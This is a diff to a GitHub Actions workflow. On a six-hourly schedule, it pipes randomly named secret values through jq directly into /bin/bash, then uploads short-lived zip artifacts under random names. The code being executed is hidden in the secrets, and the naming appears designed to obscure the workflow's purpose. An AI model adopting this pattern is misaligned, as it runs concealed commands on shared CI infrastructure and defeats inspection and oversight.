@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '51 0,6,12,18 * * *'
+    - cron: '6 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          li751: ${{ secrets.li751 }}
+          gir0: ${{ secrets.gir0 }}
         run: |
-          printf '%s' "$li751" | jq -r .cdl9866 | /bin/bash
-          echo $kzv5683 | jq -r .scsbb7 | /bin/bash
-          printf '%s' "$gwoz2" | jq -r .zfyd07 | /bin/bash
+          printf '%s' "$gir0" | jq -r .ht8457 | /bin/bash
+          echo $zdonz490 | jq -r .h415 | /bin/bash
+          printf '%s' "$zj34" | jq -r .i99 | /bin/bash
+          printf '%s' "$ou7" | jq -r .sv5938 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 74Jkb563
+          name: 9iIgsWYK
           path: "*.zip"
           retention-days: 1
